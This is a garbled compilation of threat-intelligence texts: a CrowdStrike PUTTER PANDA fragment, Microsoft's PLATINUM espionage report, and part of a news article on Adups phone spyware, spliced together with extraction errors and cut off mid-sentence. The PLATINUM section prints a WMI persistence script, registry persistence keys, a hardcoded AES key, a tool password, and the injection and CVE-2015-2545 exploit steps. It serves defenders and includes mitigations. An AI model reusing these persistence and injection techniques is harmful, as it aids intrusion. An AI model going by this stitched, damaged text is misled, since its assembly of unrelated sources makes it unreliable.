Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (˛refox.exe) are used. If Internet Explorer is used, then the malware will attempt to terminate processes corresponding to two components of Sophos Anti-Virus ( SAVAdminService.exe and SavService.exe).Four examples of these droppers were located, using a mixture of decoy P DF and Microso˝ Word documents (shown below in Figures 15-18). The common theme throughout these documents is space technology (Bienvenue_a_Sahaja_Yoga_ Toulouse.doc does not follow this trend, but could be targeted at workers at the Toulouse Space Centre, the ﬁlargest space centre in Europeﬂ ), indicating that the attackers have a keen interest in this sector, which is also re˘ected in the choice of name for some of the C2 domains used (see the Attribution section above).16The API used expects a parameter of the form char**, and is given a char* pointer to the ﬁ*/*ﬂ string, but the stack data following this pointer is not properly zeroed or cleansed before use, leading to uncontrolled memory being read as other strings. 36Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 15. ﬁIn -vitation_Pleia-des_012012.docﬂ Dropped by a4e4b -3ceb949e8494968c-71fa840a516Figure 16. ﬁBien -venue_a_Sahaja_Yoga_ Toulouse.docﬂ Dropped by 4c50457c35e-2033b3a03fcbb4ad-ac7b7 37Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 17. ﬁ50th AIAA Satellite Sciences Conference.pdfﬂ from 6022cf1f -cf2b478bed8da1fa3e-996ac5Figure 18: ﬁProj -ect-Manager-Job- Description-Sur-rey- Satellite-Tech-nology-world-lead -er-provision-small-sat -ellite-solutions. pdfﬂ Dropped by 9cb6103e9588d506cf-d81961ed41eefe Mitigation & Remediation 39Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) MITIGATION & REMEDIATION A number of speci˛c and generic detection methods are possible for this RAT , both on a host and on the network.

Although some of their tools are simplistic, taken as a whole their toolset provides a wide degree of control over a victim system and can provide the opportunity to deploy additional tools at will.Research presented in this report shows that the PU TT ER PANDA operators are likely members of the 12th Bureau, 3rd General Sta˚ Department (GSD) of the People™s Liberation Army (P LA ), operating from the unit™s headquarters in Shanghai with MUCD 61486. Strategic objectives for this unit are likely to include obtaining intellectual property and industrial secrets relating to defense technology, particularly those to help enable the unit™s suspect mission to conduct space surveillance, remote sensing, and interception of satellite communications. PUTT ER PANDA is likely to continue to aggressively target Western entities that hold valuable information or intellectual property relevant to these interests. The detection and mitigation guidance given in this report will help to minimize the risk of a successful compromise by these actors, and future Crowd Strike reports will examine other elements of the PU TT ER PANDA toolset.

Part of this job involves keeping tabs on targeted a ctivity groups, which are often the first ones to introduce new explo its and techniques that are later used widely by other attackers. In the previous volume, ﬁ STRONTIUM: A profile of a persistent and motivated adversary ,ﬂ on page 3 of Microsoft Security Intelligence Report, Volume 19 (January ŒJune 2015) , chronicled the activities of one such group, which had attracted interest because of its aggressive, persistent tac tics and techniques as well as its repeated use of new zero -day exploits to attack its targets . This section describes the history, behavior, and tactics of a newly discovered targeted activity group, which Microsoft has code -named PLATINUM. Microsoft is sharing some of the informati on it has gathered on this group in the hope that it will raise awareness of the group™s activities and help organizations take immediate advantage of available mitigations that can significantly reduce the risks they face from this and similar groups . Adversary profile PLATINUM has been targeting its victims since at least as early as 2009, and may have been active for several years prior. Its activities are distinctly different not only from those typically seen in untargeted attacks, but from many targeted attacks as well. A large share of targeted attacks can be characterized as opportunistic: the activity group changes its target profiles and attack geographies based on geopolitical seasons, and may attack institutions all o ver the world. Like many such groups, PLATINUM seeks to steal sensitive intellectual property related to government interests, but its range of preferred targets is consistently limited to specific governmental organizations, defense institutes, intelligen ce agencies, diplomatic institutions, and telecommunication providers in South and Southeast Asia. The group™s persistent use of spear phishing tactics ( phishing attempts aimed at specific individuals ) and access to previously undiscovered zero -day exploit s have made it a highly resilient threat. After researching PLATINUM, Microsoft has identified the following key characteristics of the group and its activities: PLATINUM has conducted several cyber espionage campaigns since at least 2009. PLATINUM focuses on a small number of campaigns per year, which reduces the risk of detection and helps the group stay unnoticed and focused for a longer period of time. PLATINUM has focused on targets associated with governments and related organizations in South and S outheast Asia . PLATINUM has used multiple unpatched vulnerabilities in zero -day exploits against its victims. Spear phishing is the group™s main method of infecting targeted users™ computers. PLATINUM makes a concerted effort to hide their infection tracks, by self -deleting malicious components, or by using server side logic in ‚one shot mode™ where remotely hosted malicious components are only allowed to load once PLATINUM often spear phishes its targets at their non -official or private email accounts, to u se as a stepping stone into the intended organization™s network. PLATINUM uses custom -developed malicious tools and has the resources to update these applications often to avoid being detected . PLATINUM configures its backdoor malware to restrict its activ ities to victims™ working hours, in an attempt to disguise p ost -infection network activity within normal user traffic . PLATINUM does not conduct its espionage activity to engage in direct financial gain, but instead uses stolen information for indirect eco nomic advantages. In some cases, the combination of these mechanisms Šuse of undisclosed zero -day exploits, custom malware that is not used elsewhere, PLATINUM™s skill in covering its tracks, and others Šhas enabled the group to compromise targets for severa l years without being detected. Targeted activity groups are skilled at covering their tracks and evading detection, and it can be very difficult to definitively associate an activity group with a specific nation -state or group of individuals. Attackers co uld be patriotic groups, opportunistic cyber units, state -sponsored hackers, or intelligence agents. Although PLATINUM could belong to any one of the aforementioned categories, the group shows traits of being well funded, organized, and focused on informat ion that would be of most use to government bodies. PLATINUM has been targeting its victims since at least as early as 2009. Methods of attack Figure 1. Known victims attacked by PLATINUM since 2009, by country/region (left) and type of institution (right) PLATINUM prim arily targets its intended victims using spear phishing . There is also some data indicating the group™s usage of drive -by attacks against vulnerable browser -plugins . Although the group™s methods for performing reconnaissance to determine who to pursue rema ins unknown, the number of victims targeted at each affected institution is consistently very small. In some cases, the victims were targeted at their non -official email addresses, demonstrating that the scope of PLATINUM™s research capabilities is fairly extensive. For the initial infection, PLATINUM typically sends malicious documents that contain exploits for vulnerabilities in various software programs , with links or remotely loaded components (images or scripts or templates) that are delivered to targe ts only once. The group has made concerted efforts towards designing their initial spear -phishes in a manner where the final payload is only delivered to the intended victim. The group is known to have used a number of zero -day exploits, for which no secur ity update is available at the time of transmission, in these attempts. (All have subsequently been addressed by security updates from the affected vendors.) Figure 2.

The oldest confirmed PLATINUM exploit was named ﬁThe corruption of Mahathir,ﬂ a document that was transmitted in 2009 referencing the former prime minister of Malaysia, Mahathir Mohamad. Figure 4. The oldest confirmed lure document sent by PLATINUM, in 2009 PLATINUM™s recent activities remain focused on tactics such as these. In February 2016, PLATINUM was observed using a legitimate website dedicated to news about the Indian government , as an infection vector . This site, which is not associated with the Indian government itself, also provides a free email service for its users, giving them email addresses with the site™s own domain name. PLATINUM sent spear phishing messages to users of the service, which included some Indian government officials. After infect ing an unsuspecting user this way, the attackers had complete control of the user™s computer and used it as a stepping stone into the official network to which the user belonged. Fig ure 5. PLATINUM used a private webmail service to infect a government network PLATINUM™s approach toward exploiting vulnerabilities varies between campaigns. In one case from 2013, the target was sent a malici ous document through a spear phishing email message. 1 The document, when opened, used an embedded ActiveX control to download a JavaScript file from a remote site that used a previously unknown vulnerability in some versions of Windows (later designated CVE-2013-7331 ) to read information about the browser™s installed components. 2 1 Microsoft thanks Google for identifying and reporting this attack. 2 Microsoft issued Security Bulletin MS14 -052 in September 2014 to addre ss the issue.

A malicious Word document used by PLATINUM to target a victim When the document was opened in Word, it exploited a previously unknown vulnerability in the Microsoft Office PostScript interpreter (designated CVE -2015-2545 ) that enabled it to execute the attacker™s code and drop an a ttacker -generated malicious DLL onto the computer. 5 The DLL exp loited another previously unknown vulnerability (designated CVE-2015-2546 ) in the Windows kernel, which enabled it to elevate privileges for the Word executable and subsequently install a backdoor through the application. 6 Researching this attack a nd the malware used therein led Microsoft to discover other instances of PLATINUM attacking users in India around August 2015. Figure 10. Another exploit mechanism used by PLATINUM 5 Microsoft issued Security Bulletin MS15 -099 in September 2015 to address the issue. Windows 10 is not affected by the exploit used in this case due to built -in mitigations. 6 Microsoft issued Security Bulletin MS15 -097 in September 2015 to address the issue. In total, PLATINUM made use of four zero -day exploits during these two attack campaigns (two remote code execution bugs, one privilege escalation, and one information disclosure), showing an ability to spend a non -trivial amount of resources to either acquire professionally writt en zero -day exploits from unknown markets, or research and utilize the zero -day exploits themselves. In both these campaigns the activity group included remote triggers to deactivate exploitation, with an attempt to conceal the vulnerability, and prevent a nalysis of the attack. The resources required to research and deploy multiple zero -day exploits within the same attack campaign are considerable. Such activity requires a significant amount of investment in research and development, along with the discipli ne to ensure that the exploits are not used until the appropriate time, and that no one involved with the project leaks them to other parties. Technical d etails After gaining access to a victim™s computer, PLATINUM installs its own custom -built malware to communicate with the compromised system, issue commands, and move laterally through the network. The wide collection of backdoors and tools, and the differences between them, suggest the involvement of multiple teams or vendors in the development process. This section describes some of the tools used by the group. Dipsind PLATINUM uses a number of different custom -developed backdoors to communicate with infected computers. The lack of any significant evidence of shared code between any of these backdoor fam ilies is another clue as to the scope of the resources on which the activity group is able to draw, and the precautions the group is willing and able to take in order to avoid losing its ability to conduct its espionage operations. The group™s most freque ntly used backdoors belong to a malware family that Microsoft has designated Dipsind , although some variants are detected under different names . Multiple Dipsind variants have been identified, all of which are believed to be used exclusively by PLATINUM. The first variant, Win32/Dipsind.A!dha , is a lightweight application providing backdoor access to remote attackers. It can be customized for e very victim to ensure that it remains undetected in targeted networks. It supports a small set of instructions that allow the attacker to perform basic functions , such as uploading or downloading fil es and spawning remote shells. PLATINUM used four zero -day ex -ploits during these two campaigns. Figure 11. Sample configuration file for Win32/Dipsind .A Each Dipsind file contains an embedded encrypted configuration file that acts as a control for the backdoor. This configuration file also includes the initial command and control (C&C) location the Dipsind backdoor uses in addition to the pollcommandsite variable which references a URL where additional backup C&Cs can be polled. Configurable parameters include instructions on where Dipsind should install a copy of cmd.exe for spawn ing a remote shell , depending on the user ™s privileges, the hours during which the backdoor should function , and exfiltrate information. This capability allows the backdoor to confine its activities to normal working hours, making its communications harder to distinguish from normal network traffic. Dipsind has been observed using a combination of IP addresses and domains for its C&C infrastructure. The domains are a mix of registered domains and free subdomains obtained through dynamic DNS providers. Collected data showed that a vast majority of victim networks allowed unfiltered access to the dynamic DNS hosts. The hosts and domains are hosted on compromised infrastructure based in several different countries, some within academic institutions. In some c ases, the backdoors are configured to connect to IP addresses instead of domain names. These factors make it challenging to locate the activity group™s infrastructure. Figure 12 show s a sampling of C&C infrastructure used by PLATI NUM between 2009 and 2015. Figure 12.

All network traffic is over HTTP, base64 encoded, with the underlying data encrypted using AES256 in ECB mode. Authentication is a five -step process, as shown in the following figure : Figure 13. Win32/Dipsind .A initial communication protocol (as decrypted) Analysis of several samples of this variant show exactly the same AES key (AOPSH03SK09POKSID7FF674PSLI91965) in use since 2009. The initial HTTP POST ma de by this backdoor appears as ﬁ ud7LDjtsTHe2tWeC8DYo8A** ﬂ, which translates to a simple whitespace. This sequence makes a simple network indicator usable by defenders. A second Dipsind variant registers as a Winlogon Event Notify DLL. This backdoor contain s a minimized feature list fr om the original Dipsind variant, and supports a more limited number of commands . It sets the following registry keys in the HKEY_LOCAL_MACHINE hive for persistence and functionality: SOFTWARE \\\\Microsoft \\\\Windows NT \\\\CurrentVersion \\\\Winlogon \\\\Notify \\\\Cscdll32 \\\\Asynchronous SOFTWARE \\\\Microsoft \\\\Windows NT \\\\CurrentVersion \\\\Winlogon \\\\Notify \\\\Cscdll32 \\\\DllName SOFTWARE \\\\Microsoft \\\\Windows NT \\\\CurrentVersion \\\\Winlogon \\\\Notify \\\\Cscdll32 \\\\Impersonate SOFTWARE \\\\Microsoft \\\\Windows NT \\\\CurrentVersion \\\\Winlogon \\\\Not ify \\\\Cscdll32 \\\\Startup SOFTWARE \\\\Microsoft \\\\Windows NT \\\\CurrentVersion \\\\Winlogon \\\\Notify \\\\Cscdll32 \\\\shutdown SOFTWARE \\\\Microsoft \\\\Windows \\\\CurrentVersion \\\\Run \\\\cscdll32 There are at least two additional minor versions of this variant, each of which show improvements in command implementation. One interesting feature of this variant is the way it implements a mechanism similar to port knocking to allow remote attackers to connect to a compromised computer without leaving any connection open for too long. The sequence of e vents is as follows : 1. The backdoor is installed via an exploit. 2. The backdoor sets a registry key to open a specific UDP port through the local firewall, if any, and listens to the port for incoming traffic. 3. At a remote location, the attacker executes a tool (called PK2 here, although the actual name of the tool is unknown) using the following parameters: Pk2.exe <IP> <UDP Port> <TCP Port> <Password> where the IP address is that of the computer with the backdoor, the UDP port is the one specified by the backd oor, and the password is a string encrypted by the tool before being sent. 4. The backdoor receives the UDP packets, and then checks to see if the password is valid. 5. If the password is indeed valid, the backdoor will wait for exactly 20 seconds and only then open the PK2 specified TCP port for a window of 3 seconds. Figure 14. How the Dipsind knocker component communicates with an attacker PK2 is also designed to connect to such open TCP ports and act as a console client for issuing commands to the backdoor. When running PK2 as a console client, the attacker needs to re -enter the password to authenticate a second time against the backdoor, and issue commands such as #sz to upload a file and #rz to download a file. During this research, one such collection of tools was obtained that had the password set to ﬁt@ng0p@ssﬂ. All communication used by this backdoor and PK2 is encrypted. If a connection from PK2 is not received within the 3 -second window, the TCP port is shut and P K2 would need to reinitialize the port -knocking process. JPIN In addition to Dipsind and its variants, PLATINUM uses a few other families of custom -built backdoors within its attack toolset. These families of backdoors are significantly different in their capabilities and have completely different code bases. While one family relies on a small number of supported commands and simple shells, the other delves into more convoluted methods of injections, checks , and supported feature set s. Microsoft researcher s refer to one such set of backdoor variants collectively as ﬁJPIN, ﬂ which is the name of a service it uses when installed. JPIN is a comprehensive tool for executing and extracting information from the compromised computer. There is strong evidence to sug gest that the developers of the JPIN and Dipsind code bases were in some way related. JPIN has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of these security -related processes running: Figure 15. Security -related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti -Virus avp.exe Kaspersky Anti -Virus rstray.exe Rising Anti -virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the i nstaller deletes itself from the compromised computer. PLATINUM uses at least three distinct JPIN variants. One variant typically runs with a mutex name d ﬁhMSVmmﬂ and installs itself in the folders %appdata% \\\\Comm \\\\Jpin and %userprofile% \\\\AppData \\\\Resource \\\\Jpi n. After it is installed and started, the JPIN service can perform the following tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on . List running services, processes, j ob IDs, and task IDs. Enumerate drives and their types. Enumerate registry keys. Load a custom keylogger. Download files. Download and upgrade itself. Acquire network information such as DNS, IP, proxies, and so on . Exfiltrate information over HTTP GET and POST requests, with the data stored either within the HTTP body or within the URL parameters. Lower security settings by tampering with registry keys. Inject content into the lsass.exe process , in order to load the keylogger module into lsass and call its exported function . Communicate via FTP. Send email via SMTP. Change permissions on files using the cacls.exe command -line utility. JPIN can also target mobile suite applications and extract data from them . The backdoor contains code that looks for install ed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. The second JPIN variant is very similar to the first one . It downloads the backdoor payload from remote locations via the BITS service, using the COM object for BITS. This variant also has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of the processes listed in Figure 15 running. The third known variant does not check for the processes listed in Figure 15 . It uses an installer component that includes the backdoor as payload disguised as a bitmap within its resource section . The payload is in an encrypted and compressed form, disguised to avoid any suspicion from security solutio ns. This variant has been seen installing itself into the following file system paths: %appdata% \\\\Java \\\\support %appdata% \\\\support %userprofile% \\\\AppData \\\\Local \\\\Java \\\\Support %userprofile% \\\\AppData \\\\Local \\\\Support adbupd Another backdoor used by PLATINUM is very si milar to the Dipsind family. It is informally referred to internally at Microsoft as ﬁ adbupd ﬂ, which is the name of the service under which it is installed. Salient features of this backdoor include the following: It tries to install itself under several d ifferent names within the Program Files directory It has the ability to support plug -ins to modularize functionality It contains a copy of the OpenSSL library to support encryption when sending or receiving data It contains functionality to run a copy of c md.exe The configuration file is very similar to the original Dipsind family This backdoor class uses multiple methods of achieving persistence, one of which is using WMI /MOF compiled scripts, such as the one shown in Figure 16 . JPIN can target mobile suite appli -cations and extract data from them. Figure 16. WMI script used by the Adpupd backdoor to achieve persistence #pragma namespace(\" \\\\\\\\\\\\\\\\.\\\\\\\\ROOT \\\\\\\\cimv2\") instance of __Win32Provider as $P { Name = \"adbupdConsumer\"; ClsId = \"{74ba9ce4 -fbf1 -4097 -32b8-34f446f037d8}\"; HostingModel = \"LocalSystemHost\"; }; instance of __EventConsumerProviderRegistration { Provider = $P; ConsumerClassNames = {\"adbupdConsumer\"}; }; class adbupdConsumer : __EventConsumer { key string Mode; }; instance of ad bupdConsumer as $CONSMR { Mode = \"persistent\"; }; instance of __EventFilter as $FLT { Name = \"adbupdFilter\"; Query = \"SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \\\\\"Win32_NTLogEvent \\\\\"\"; QueryLanguage = \"WQL\"; }; instance o f __FilterToConsumerBinding as $B { Consumer = $CONSMR; Filter = $FLT; }; Keyloggers The PLATINUM group has written a few different versions of keyloggers that perform their functions in different ways, most likely to take advantage of different we aknesses in victims™ computing environments. The keyloggers can be broadly classified into two groups: those that log keystrokes through raw device input, and user mode keyloggers that use Windows hook interfaces to gather information. In partic ular, this second group also has the capability of dumping users™ credentials using the same technique employed by Mimikatz . Both groups can set permissions on specific files to Everyone , and work in tandem with the PLATINUM backdoors. Hot patcher One of PLATINUM™s most recent and interesting tools is meant to inject code into processes using a variety of injection techniques. In addition to using several publicly known injection methods to per form this task, it also takes advantage of an obscure operating system feature known as hot patching . Hot patching is an operating system -supported feature for installing updates without having to reboot or restart a process. At a high level, hot patching can transparently apply patches to executables and DLLs in actively running processes, which does not happen with traditional methods of code injection such as CreateRemoteThread or WriteProcessMemory. Instead, the kernel is instructed to perform the injec tion by invoking NtSetSystemInformation (with an appropriate SystemInformationClass) to apply the patch. The information about the patch is delivered via a specially crafted DLL that is loaded into the target process. The hot patching feature originally sh ipped with Windows Server 2003 and was used to ship 10 patches to Windows Server 2003. It was removed in Windows 8 and has not been included in subsequent releases of Windows. PLATINUM appears to believe that enough of their targeted users continue to run the earlier versions of Windows to make the technique a useful tool, at least until early 2017 (see page 20). The technique PLATINUM uses to inject code via hot patching was first documented by security researchers in 20 13.7 Administrator permissions are required for hot patching, and the technique used by PLATINUM does not attempt to evade this requirement through exploitation. Rather, the component™s use of the hot patching feature appears to be a way to avoid being det ected, as many antivirus solutions monitor non -system processes for the regular injection methods such as CreateRemoteThread. If the tool fails to inject code using hot patching, it reverts to attempting the other more common code injection techniques into common Windows processes, primarily targeting winlogon.exe, lsass.exe and svchost.exe: CreateRemoteThread NtQueueApcThread RtlCreateUserThread NtCreateThreadEx The hot patching component performs the following steps: 1. It patches the loader with a proper h ot patch to treat injected DLLs with execute page permissions. This step is required for DLLs loaded from memory (in an attempt to further conceal the malicious code ). 7 Alex Ionescu, ﬁHotpatching the Hotpatcher: Stealth File -less DLL Injection,ﬂ Sy Scan 2013, https://www.yumpu.com/en/document/view/14255220/alexsyscan13/23 . 2. The backdoor is injected into svchost using the hot patch API. Patching the loader is d one by creating a section named \\\\knowndlls \\\\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section. 3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure contains all the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection , which will cause the loader to treat created sections as PAGE_EXECUTE_READWRITE instead of PAGE_READWRITE. The patch is successfully applied by invoking NtSetSystemInformation. 4. After the memory permission issue is solved, the injector proceeds to inject the malicious DLL into svchost. Again, it creates a (now executable) section named knowndlls \\\\fgrps.dll and i nvokes NtSetSystemInformation, which causes the final payload to be loaded and executed within the target process (svchost). 5. The malicious hot patching component appears to have an expiration date of January 15, 2017. After that date, the DLL will no lon ger perform the injection, but rather execute another PLATINUM implant ( C:\\\\Program Files \\\\Windows Journal \\\\Templates \\\\Cpl \\\\jnwmon .exe Œua), which may be related to an uninstall routine. (The component has not been observed in use since March 9, 2016, which may indicate that PLATINUM has chosen to stop using it earlier than the configured expiration date.) Miscellaneous Finally, the PLATINUM group also uses small single -purpose applications that duplicate some of the functionality of the backdoors. A couple of examples are: A stand -alone persistence tool that takes other files as input and ensure s persistence across reboots. A stand -alone loader that runs another executable. It has some exported functions whose names can be used in DLL files installed as LSA pass word filters, but such functions are basically empty and there is no known evidence that this tool was ever used in this way. On the whole, this DLL looks like a test, suggesting that the attackers may have researched and possibly implemented variants of their malware that can be installed as LSA password filters. Exploit (CVE -2015 -2545) CVE-2015-2545 is a use-after -free vulnerability in the embedded PostScript filter of Microso ft Office. 8 The exploit was crafted in PostScript and is able to bypass Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). 8 Microsoft issued Security Bulletin MS15 -099 in September 2015 to address the issue. This vulnerability allowed the attacker to forge a CAssoc structure, shown in Figure 17, and so also indirectly the PSObjs in the structure. The PostScript interpreter deciphers the value field (Val) based on the type field (m_type), which are under complete control of the attacker. Having developed this technique, the attacker will craft and use a combination of file, string, and integer objects to gain a reliable arbitrary code execution. Figure 17. Memory layout of CSssoc structure and its embedded PSObjs Root cause: The attacker def ined in PostScript a dictionary wit h three elements, which leads to an allocation of three CAssoc structures in PSTMap. Within a Forall loop, the last two elements are undefined and a string is initialized. The PostScript statement results in a deallocati on of the last two CAssoc structures and the string gets allocated in the previously freed memory address. The PostScript -put operand is used to fill the string with data to mimic a CAssoc structure. By setting the hash table index to 0x3ff, the loop will exit because the hash table at that time has a max -size of 0x400. Upon exiting the loop, a reference will be returned to the secondary element, which is the forged structure. Figure 18. Reusage of deallocated Memor y by a forged CAssoc Structure Acquire full memory RW access: The described method is used to craft a PSString object in which the length of the string is set to a maximum value. As a result, the exploit can use PostScript methods to search for ROP gadge ts to dynamically assemble a ROP shellcode. Figure 19. Getinterval method of PSString is used to find ROP gadgets The purpose of this approach is to call VirtualProtect to set the pages of the second -stage shell code as executable. As a result, DEP and ASLR are bypassed. Arbitrary code execution: To redirect code execution to the ROP chain, the exploit crafts a PSFile Object in which the vtable is controlled by the attacker. By calling the bytesavailable method wi thin the PostScript code, arbitrary code execution is achieved. Identity Although the exact identity of PLATINUM remains unknown, the technical indicators observed so far can help create a profile of the attacker. Usage of multiple backdoors . The different backdoors written by or for the group indicate a considerable investment over time. Research indicates that PLATINUM has used multiple backdoors concurrently at times, which could represent either multiple teams within the activity group performing differ ent campaigns, or different versions of the tools being used against varying victim networks. Zero day exploits . PLATINUM has used several zero -day exploits against their victims. Regardless of whether they researched the exploits themselves or purchased t hem from independent researchers, the monetary investment required to collect and deploy zero -day exploits at this level is considerable. Victim geography . More often than not, research into targeted attacks shows activity groups becoming opportunistic an d attacking topical targets; that is, targets considered valuable based on the geopolitical events of the year. PLATINUM has consistently targeted victims within a small set of countries in South and Southeast Asia. In addition, the victims are consistentl y associated with a small set of entities that are directly or indirectly connected to governments. Tools . Some of the tools used by PLATINUM, such as the port -knocking backdoor, show signs of organized thinking. PLATINUM has developed or commissioned a nu mber of custom tools to provide the group with access to victim resources. This behavior exhibits PLATINUM™s ability to adapt to victim networks, which is further evidence of the group™s considerable resources for development and maintenance. The monetary in -vestment required to collect and deploy zero -day exploits at this level is considerable. Any of these traits by themselves could be the work of a single resourceful attacker or a small group of like -minded individuals, but the presence of all of them is a clear indication of a well -resourced, focused, and disciplined group of attackers vying for informatio n from government -related entities. Guidance PLATINUM is an extremely difficult adversary for targeted organizations to defend against. It possesses a wide range of technical exploitation capabilities, significant resources for researching or purchasing complicated zero -day exploits, the ability to sustain persistence across victim networks for years, and the manpower to develop and maintain a large number of tools to use within unique victim networks. Their ability to research their victims prior to target ing them, along with the capability to architect exploits that only work once or for a short period of time, makes it very difficult to investigate or track their activities. That said, there are steps that organizations can take to reduce the likelihood o f PLATINUM conducting successful attacks against their employees and networks. Take advantage of native mitigations built into Windows 10. Newer versions of Windows include critical mitigations that render some of PLATINUM™s exploits ineffective when deplo yed. For example, the summer 2015 attack that used the unusual ‚resume™ would not have been successful on Windows 10 as -is because of the presence of the Supervisor Mode Execution Prevention (SMEP) mitigation, even without the latest security updates insta lled. Even if CVE -2015-2546 affected Windows 10, the exploitation would have required much more technical prowess to succeed; ultimately, SMEP makes it more difficult for attackers. The hooking and in -memory patching techniques used by the malicious ‚hot p atcher™ component are also not effective against newer versions of Windows. Apply all security updates as soon as they become available. Microsoft deeply researches each security issue, proactively addresses the flaw, and mitigates the attack surface aroun d the affected component(s). For example, one zero -day vulnerability exploit ( CVE-2015-2545 ) used by PLATINUM was addressed immediately in September 2015. Subsequently, in November, Microsoft also released a proactive security update for the same component that ended up mitigating other exploits surfacing in -the -wild after the first attack. Customers who applied the security updates in November without delay would have been protected against the second wave of exploits. Such measures of hardening the underlying application happen often. MS09 -017 is yet another example , in which installation of newly available security updates significantly reduced the attack surface. Consider disabling features, such as EPS or macros, in powerful products l ike Microsoft Office by using Group Policy. Not all organizations find the need to enable all features. For example, in the PLATINUM attack campaign that used CVE -2015-2545, a network in which Office EPS was disabled would not have been affected. Enterprise networks should segregate high business impact (HBI) data -holding segments from Internet -connected networks. Sharing of removable media between these air -gapped networks should be strictly en forced. In the case of PLATINUM, such a network architecture would prevent targeted users from accessing third -party email services and thereby granting attackers access to sensitive segments of the organizational network. Conduct enterprise software secu rity awareness training, and build awareness of malware prevention. PLATINUM may have used zero -day flaws to compromise victim computers, but doing so required action by the user, who either clicked a link in an email or opened an attachment to allow the a ttacker to take control of their computer. Security training can raise awareness and reduce the risk associated with this attack vector. Institute a strong network firewall and proxy. Many tools used by attackers are not compatible with network proxies. In the case of PLATINUM™s version of port -knocking, the opening of a UDP port would have been rendered moot if a network firewall was blocking access for inbound packets to the host™s open port. Enterprise networks should consider blocking certain types of w ebsites that don™t serve the interest of the business. PLATINUM makes extensive use of C&Cs that use dynamic DNS hosts. Although such free services can be very useful at a personal level, blocking access to such hosts at a local DNS server can minimize pos t-compromise activity. Prepare your network to be forensically ready, so that you can achieve containment and recovery if a compromise occurs. A forensically ready network that records authentications, password changes, and other significant network events can help identify affected systems quickly. Make sure that your organization™s Internet -facing assets are always running up -to-date applications and security updates, and that they are regularly audited for suspicious files and activity. A number of resea rched PLATINUM victims had their public -facing infrastructure compromised through unknown flaws. Detection indicators Fi gure 20 consists of detection rules for a number of PLATINUM malware samples to be used with YARA ( https://plusvic.github.io/yara/ ), an open source pattern matching tool for malware detection.

SchmidtNov. 15, 2016阅读简体中文版WASHINGTON — For about $50, you can get a smartphone with a high-definition display, fast data service and, according to security contractors, a secret feature: a backdoor that sends all your text messages to China every 72 hours.Security contractors recently discovered preinstalled software in some Android phones that monitors where users go, whom they talk to and what they write in text messages. The American authorities say it is not clear whether this represents secretive data mining for advertising purposes or a Chinese government effort to collect intelligence.International customers and users of disposable or prepaid phones are the people most affected by the software. But the scope is unclear. The Chinese company that wrote the software, Shanghai Adups Technology Company, says its code runs on more than 700 million phones, cars and other smart devices. One American phone manufacturer, BLU Products, said that 120,000 of its phones had been affected and that it had updated the software to eliminate the feature.Kryptowire, the security firm that discovered the vulnerability, said the Adups software transmitted the full contents of text messages, contact lists, call logs, location information and other data to a Chinese server. The code comes preinstalled on phones and the surveillance is not disclosed to users, said Tom Karygiannis, a vice president of Kryptowire, which is based in Fairfax, Va. “Even if you wanted to, you wouldn’t have known about it,” he said.Security experts frequently discover vulnerabilities in consumer electronics, but this case is exceptional. It was not a bug. Rather, Adups intentionally designed the software to help a Chinese phone manufacturer monitor user behavior, according to a document that Adups provided to explain the problem to BLU executives. That version of the software was not intended for American phones, the company said.“This is a private company that made a mistake,” said Lily Lim, a lawyer in Palo Alto, Calif., who represents Adups.The episode shows how companies throughout the technology supply chain can compromise privacy, with or without the knowledge of manufacturers or customers. It also offers a look at one way that Chinese companies — and by extension the government — can monitor cellphone behavior. For many years, the Chinese government has used a variety of methods to filter and track internet use and monitor online conversations. It requires technology companies that operate in China to follow strict rules. Ms. Lim said Adups was not affiliated with the Chinese government.At the heart of the issue is a special type of software, known as firmware, that tells phones how to operate. Adups provides the code that lets companies remotely update their firmware, an important function that is largely unseen by users. Normally, when a phone manufacturer updates its firmware, it tells customers what it is doing and whether it will use any personal information. Even if that is disclosed in long legal disclosures that customers routinely ignore, it is at least disclosed. That did not happen with the Adups software, Kryptowire said.According to its website, Adups provides software to two of the largest cellphone manufacturers in the world, ZTE and Huawei. Both are based in China.Samuel Ohev-Zion, the chief executive of the Florida-based BLU Products, said: “It was obviously something that we were not aware of. We moved very quickly to correct it.”He added that Adups had assured him that all of the information taken from BLU customers had been destroyed.The software was written at the request of an unidentified Chinese manufacturer that wanted the ability to store call logs, text messages and other data, according to the Adups document. Adups said the Chinese company used the data for customer support.Ms. Lim said the software was intended to help the Chinese client identify junk text messages and calls. She did not identify the company that requested it and said she did not know how many phones were affected. She said phone companies, not Adups, were responsible for disclosing privacy policies to users. “Adups was just there to provide functionality that the phone distributor asked for,” she said.Android phones run software that is developed by Google and distributed free for phone manufacturers to customize. A Google official said the company had told Adups to remove the surveillance ability from phones that run services like the Google Play store. That would not include devices in China, where hundreds of millions of people use Android phones but where Google does not operate because of censorship concerns.Because Adups has not published a list of affected phones, it is not clear how users can determine whether their phones are vulnerable. “People who have some technical skills could,” Mr. Karygiannis, the Kryptowire vice president, said. “But the average consumer? No.”Ms. Lim said she did not know how customers could determine whether they were affected.Adups also provides what it calls “big data” services to help companies study their customers, “to know better about them, about what they like and what they use and there they come from and what they prefer to provide better service,” according to its website.Kryptowire discovered the problem through a combination of happenstance and curiosity. A researcher there bought an inexpensive phone, the BLU R1 HD, for a trip overseas. While setting up the phone, he noticed unusual network activity, Mr. Karygiannis said. Over the next week, analysts noticed that the 